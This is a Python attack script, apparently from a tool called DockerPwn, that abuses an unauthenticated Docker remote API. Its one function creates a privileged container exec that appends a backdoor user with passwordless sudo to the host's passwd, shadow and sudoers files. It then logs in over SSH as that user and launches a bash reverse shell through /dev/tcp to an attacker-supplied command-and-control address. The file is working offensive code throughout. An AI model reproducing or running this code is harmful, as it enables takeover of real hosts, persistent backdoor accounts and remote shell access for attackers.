import http.client
import json
import sys
import paramiko
import re
import time

def attack(target, port, containerID, c2):

    dockerConnection = http.client.HTTPConnection(target, port)

    headers = {
        'X-Requested-With': 'DockerPwn.py',
        'Content-Type': 'application/json',
    }
    
    print('[+] Phew, alright. Creating the EXEC to create DockerPwn user.\n')

    execJSON = json.dumps({
        "AttachStdin": True,
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["/bin/sh", "-c", "echo -n 'DockerPwn:x:65535:65535:DockerPwn:/tmp:/bin/bash' >> /host/etc/passwd && echo -n 'DockerPwn:$6$ilDk.19ZUBhQbxkA$6rv9s1sJcecVNwwW2V9uEl4QlJ/V0d5JK/lXAAdSUF7W3b2oGmp37I2qm.2iNGt.JXqKdoW4oGHaUSgABP5vA.:18113:65535:99999:7:::' >> /host/etc/shadow && echo -n 'DockerPwn ALL=(ALL) NOPASSWD: ALL' >> /host/etc/sudoers"],
        "DetachKeys": "ctrl-p,ctrl-q",
        "Privileged": True,
        "Tty": True,
    })
    
    dockerConnection.request('POST', '/containers/' + containerID[0] + '/exec', execJSON, headers)
    execResponse = dockerConnection.getresponse()
    
    if execResponse.status == 201:
        execResponse = str(execResponse.read())
        execID = re.findall(r'[A-Fa-f0-9]{64}', execResponse)
        print('[+] EXEC successfully created on container! Got ID ' + execID[0] + '!\n')
        dockerConnection.close()
    else:
        print('[-] EXEC creation failed. Maybe try again?\n')
        dockerConnection.close()
        sys.exit(0)

    print('[+] Now triggering the EXEC to create DockerPwn user\n')

    triggerJSON = json.dumps({
        "Detach": False,
        "Tty": False
    })

    dockerConnection.request('POST', '/exec/' + execID[0] + '/start', triggerJSON, headers)
    triggerResponse = dockerConnection.getresponse()

    if triggerResponse.status == 200:
        print('[+] EXEC successfully triggered. User DockerPwn:DockerPwn created with SUDO permissions!\n')
        dockerConnection.close()
    else:
        print('[-] EXEC job did not trigger. Maybe our ID was wrong?')
        sys.exit(0)

    
    print('[+] OK, looking good. Attempting to auth via Paramiko - this might take a few seconds.\n')

    time.sleep(5)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    conn = 'null'

    try:
        conn = ssh.connect(target, 22, 'DockerPwn', "DockerPwn")
    except paramiko.AuthenticationException:
        print('[-] Login failed for user DockerPwn. Quitting.')
        ssh.close()
        sys.exit(0)

    if conn is None:
        print('[+] Login succeeded for DockerPwn!\n')
        ssh.exec_command('sleep 5; bash -i >& /dev/tcp/' + c2.split(":")[0] + "/" + c2.split(":")[1] + ' 0>&1')
    